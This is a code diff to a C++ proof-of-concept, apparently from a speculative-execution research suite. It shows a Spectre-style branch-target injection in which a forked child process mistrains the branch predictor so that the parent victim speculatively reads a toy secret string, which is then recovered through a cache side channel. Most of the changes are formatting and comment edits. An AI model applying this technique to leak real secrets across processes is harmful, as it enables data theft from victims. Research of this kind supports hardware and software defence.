@@ -14,28 +14,33 @@
  * limitations under the License.
  */
 
+/**
+ * This example exploits the fact that forked processes have the same code
+ * addresses (and therefore also jump source and jump destination addresses).
+ * We create two processes - the child that acts as an attacker and confuses the
+ * branch predictor to jump on addresses that reveal private data.
+ * Those jump targets are architecturally impossible on the parent process that
+ * acts as the victim. While jumping architecturally always on a method that
+ * accesses only public data, sometimes speculatively jumps on the incorrect
+ * branch address that is injected by the child.
+ **/
+
 #ifndef __linux__
 #  error Unsupported OS. Linux required.
 #endif
-
-#include <array>
-#include <cstring>
-#include <iostream>
 
 #include <sched.h>
 #include <signal.h>
 #include <sys/types.h>
 #include <unistd.h>
 
+#include <array>
+#include <cstring>
+#include <iostream>
+
 #include "cache_sidechannel.h"
 #include "instr.h"
 
-// Objective: given some control over accesses to the *non-secret* string
-// "xxxxxxxxxxxxxx", construct a program that obtains "It's a s3kr3t!!!"
-// without ever accessing it in the C++ execution model, using speculative
-// execution and side channel attacks. The public data is intentionally just
-// xxx, so that there are no collisions with the secret and we don't have to
-// use variable offset.
 const char *public_data = "xxxxxxxxxxxxxxxx";
 const char *private_data = "It's a s3kr3t!!!";
 constexpr size_t kAccessorArrayLength = 4096;
@@ -44,7 +49,7 @@ constexpr size_t kCacheLineSize = 64;
 // Used in pointer-arithmetics and control-flow. On the child (attacker) it is
 // 0, on the parent (victim) it is non-zero (it stores the pid of the child).
 pid_t pid;
-// Stores the parent pid. Used to terminate the child.
+// Stores the parent pid. Used by the child to terminate itself.
 pid_t ppid;
 
 // DataAccessor provides an interface to access bytes from either the public or
@@ -52,32 +57,28 @@ pid_t ppid;
 class DataAccessor {
  public:
   virtual char GetDataByte(size_t index) = 0;
-  virtual ~DataAccessor() {};
+  virtual ~DataAccessor(){};
 };
 
 // PrivateDataAccessor returns private_data. Used only by the child (attacker).
-class PrivateDataAccessor: public DataAccessor {
+class PrivateDataAccessor : public DataAccessor {
  public:
-  char GetDataByte(size_t index) override {
-    return private_data[index];
-  }
+  char GetDataByte(size_t index) override { return private_data[index]; }
 };
 
 // PublicDataAccessor returns public_data. Used only by the victim (parent).
-class PublicDataAccessor: public DataAccessor {
+class PublicDataAccessor : public DataAccessor {
  public:
-  char GetDataByte(size_t index) override {
-    return public_data[index];
-  }
+  char GetDataByte(size_t index) override { return public_data[index]; }
 };
 
 // Public data accessor. Used by the victim (parent). Leaks only public data.
-auto public_data_accessor = std::unique_ptr<DataAccessor>(
-    new PublicDataAccessor);
+auto public_data_accessor =
+    std::unique_ptr<DataAccessor>(new PublicDataAccessor);
 
 // Private data accessor. Used by the attacker (child). Leaks private data.
-auto private_data_accessor = std::unique_ptr<DataAccessor>(
-    new PrivateDataAccessor);
+auto private_data_accessor =
+    std::unique_ptr<DataAccessor>(new PrivateDataAccessor);
 
 // On the victim (parent) it leaks data that is physically located at
 // private_data[offset], without ever loading it. In the abstract machine, and
@@ -109,8 +110,9 @@ static char LeakByte(size_t offset) {
       //                    ? public_data_accesor.get();
       // Parent (victim) uses public_data_accessor, child (attacker) uses
       // private_data_accessor.
-      pointer = private_data_accessor.get() + static_cast<bool>(pid) * (
-          public_data_accessor.get() - private_data_accessor.get());
+      pointer = private_data_accessor.get() +
+                static_cast<bool>(pid) *
+                    (public_data_accessor.get() - private_data_accessor.get());
     }
 
     for (size_t i = 0; i < kAccessorArrayLength; ++i) {
@@ -118,7 +120,7 @@ static char LeakByte(size_t offset) {
 
       // We make sure to flush whole accessor object in case it is
       // hypothetically on multiple cache-lines.
-      const char *accessor_bytes = reinterpret_cast<const char*>(accessor);
+      const char *accessor_bytes = reinterpret_cast<const char *>(accessor);
 
       for (size_t j = 0; j < sizeof(PublicDataAccessor); j += kCacheLineSize) {
         CLFlush(accessor_bytes + j);
@@ -127,8 +129,8 @@ static char LeakByte(size_t offset) {
       // Speculative fetch at the offset. Architecturally the victim fetches
       // always from the public_data, though speculatively it fetches the
       // private_data when it is mistrained.
-      ForceRead(isolated_oracle.data() + static_cast<size_t>(
-            accessor->GetDataByte(offset)));
+      ForceRead(isolated_oracle.data() +
+                static_cast<size_t>(accessor->GetDataByte(offset)));
     }
 
     // Only the parent (victim) computes results.
